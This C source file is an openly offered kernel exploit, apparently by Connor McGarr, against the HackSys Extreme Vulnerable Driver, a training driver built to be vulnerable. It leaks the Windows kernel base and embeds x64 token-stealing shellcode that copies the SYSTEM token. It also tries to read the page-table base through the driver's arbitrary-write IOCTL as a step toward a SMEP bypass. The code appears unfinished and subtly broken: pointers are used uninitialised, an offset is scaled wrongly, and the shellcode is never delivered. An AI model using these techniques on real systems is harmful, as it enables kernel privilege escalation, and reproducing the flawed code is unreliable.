// HackSys Extreme Vulnerable Driver Kernel Exploit (x64 Arbitrary Overwrite & SMEP Enabled utilizing KUSER_SHARED_DATA+0x800)
// Author: Connor McGarr
// Compilation on Windows via gcc: gcc Windows10_WriteWhatWhere.c -o exploit.exe -lpsapi

#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

#define IOCTL_CODE 0x0022200B

unsigned long long kernelBase(void)
{
	// Defining EnumDeviceDrivers() parameters
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;

	// Calling EnumDeviceDrivers()
	printf("[+] Calling EnumDeviceDrivers()...\n");

	BOOL baseofDrivers = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);

	// Error handling
	if (!baseofDrivers)
	{
		printf("[-] Error! Unable to invoke EnumDeviceDrivers(). Error: %d\n", GetLastError());
		exit(1);
	}

	// ntoskrnl.exe is the first module dumped in the array
	// Typcasting LPVOID to unsigned long long
	unsigned long long krnlBase = (unsigned long long)lpImageBase[0];

	// Print update for kernel base
	printf("[+] Found kernel leak!\n");
	printf("[+] ntoskrnl.exe is located at: 0x%llx\n", krnlBase);

	return krnlBase;
}

void exploitWork()
{

	// Passing krnlBase from kernelBase() function to exploitWork()
	unsigned long long baseAddress = kernelBase();

	// Defining KUSER_SHARE_DATA
	unsigned long long KUSER_SHARED_DATA = 0xfffff78000000000;

	/*
		[BITS 64]
		_start:
			mov rax, [gs:0x188]	; Current thread (_KTHREAD)
			mov rax, [rax + 0xb8]	; Current process (_EPROCESS)
			mov rbx, rax		; Copy current process (_EPROCESS) to rbx
		__loop:
			mov rbx, [rbx + 0x2f0] 	; ActiveProcessLinks
			sub rbx, 0x2f0		; Go back to current process (_EPROCESS)
			mov rcx, [rbx + 0x2e8] 	; UniqueProcessId (PID)
			cmp rcx, 4 		; Compare PID to SYSTEM PID 
			jnz __loop		; Loop until SYSTEM PID is found
			mov rcx, [rbx + 0x358]	; SYSTEM token is @ offset _EPROCESS + 0x358
			and cl, 0xf0		; Clear out _EX_FAST_REF RefCnt
			mov [rax + 0x358], rcx	; Copy SYSTEM token to current process
			xor rax, rax		; STATUS_SUCCESS
			ret			; Done!
	*/

	// One QWORD write = splitting shellcode into 9, 8 byte pieces
	struct shellcode {
		unsigned long long shellcodeOne;
		unsigned long long shellcodeTwo;
		unsigned long long shellcodeThree;
		unsigned long long shellcodeFour;
		unsigned long long shellcodeFive;
		unsigned long long shellcodeSix;
		unsigned long long shellcodeSeven;
		unsigned long long shellcodeEight;
		unsigned long long shellcodeNine;
	} shellcodeStructure;

	shellcodeStructure.shellcodeOne = 0x00018825048B4865;
	shellcodeStructure.shellcodeTwo = 0x000000B8808B4800;
	shellcodeStructure.shellcodeThree = 0x02F09B8B48C38948;
	shellcodeStructure.shellcodeFour = 0x0002F0EB81480000;
	shellcodeStructure.shellcodeFive = 0x000002E88B8B4800;
	shellcodeStructure.shellcodeSix = 0x8B48E57504F98348;
	shellcodeStructure.shellcodeSeven = 0xF0E180000003588B;
	shellcodeStructure.shellcodeEight = 0x4800000358888948;
	shellcodeStructure.shellcodeNine = 0x0000000000C3C031;

	// Structure for extracting the base of the PTEs
	typedef struct pteBase {
		PULONGLONG WhatPTEBase;
		PULONGLONG WherePTEBase;
	} BaseStructure, *PBaseStructure;

	// Create instance of structure
	BaseStructure pteBaseStructure;

	// Create pointer to struct
	PBaseStructure pteBaseStructurePointer;

	// Zero out structure
	memset(&pteBaseStructure, 0, sizeof(pteBaseStructure));

	// Location of nt!MiGetPteAddress+0x13
	printf("[+] nt!MiGetPteAddress+0x13 is located at: 0x%llx\n", baseAddress+0x1b607);

	// Initializing structure for extracting PTE base
	pteBaseStructure.WhatPTEBase = (PULONGLONG)baseAddress+0x1b607;
	pteBaseStructure.WherePTEBase = NULL;
	
	// Obtaining handle to the driver
	printf("[+] Obtaining handle to the driver via CreateFileA()...\n");

	HANDLE drvHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0x0,
		NULL,
		0x3,
		0x0,
		NULL
	);

	// Error handling
	if (!drvHandle)
	{
		printf("[-] Error! Unable to obtain a handle to the driver. Error: %d\n", GetLastError());
		exit(1);
	}

	// Print update for HANDLE
	printf("[+] Handle to the driver: %d\n", drvHandle);

	// Sending buffer to the driver

	// Defining lpBytesReturned parameter
	DWORD lpBytesReturned;

	BOOL sendIoctl = DeviceIoControl(
		drvHandle,
		IOCTL_CODE,
		pteBaseStructurePointer,
		0x10,
		NULL,
		0,
		&lpBytesReturned,
		NULL
		);

	// Error handling
	if (!sendIoctl)
	{
		printf("[-] Error! Unable to interact with the driver. Error: %d\n", GetLastError());
		exit(1);
	}

	printf("[+] Interacting with the driver...\n");

	// Define pointer placeholder and actual PTE base value
	PULONGLONG hold;

	// Saving base of PTEs in a pointer
	pteBaseStructure.WherePTEBase = (PULONGLONG)hold;

	// Dereference pointer and set it to pteBaseAddress variable
	PULONGLONG pteBaseAddress = (PULONGLONG)&hold;

	printf("[+] Base of the page table entries: 0x%llx\n", pteBaseAddress);
}

int main()
{
	exploitWork();

	return 0;
}
